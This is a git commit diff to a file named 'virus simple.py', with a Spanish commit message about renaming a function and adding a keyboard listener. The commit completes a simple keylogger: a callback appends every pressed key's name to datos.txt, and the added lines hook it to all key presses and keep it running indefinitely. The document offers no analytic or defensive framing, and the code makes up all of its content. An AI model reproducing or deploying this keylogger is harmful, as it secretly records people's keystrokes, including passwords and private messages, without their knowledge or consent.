bc57a695bbedde64c82fd6ad7e8ff7cd9480c57f
mateovivas453-dot <mateovivas453@gmail.com>
2026-02-04 20:26:06 -0500

    Refactor function name and add keyboard listener

--- virus simple.py
+++ virus simple.py
@@ -1,8 +1,11 @@
-import keyboard 
+import keyboard   
 
-def Presionar_Tecla(tecla):
+def presionar_tecla(tecla):
     with open('datos.txt', 'a') as archivo:
         if tecla.name == 'space':
             archivo.write(' ')
         else:
             archivo.write(tecla.name)
+
+keyboard.on_press(presionar_tecla)
+keyboard.wait()
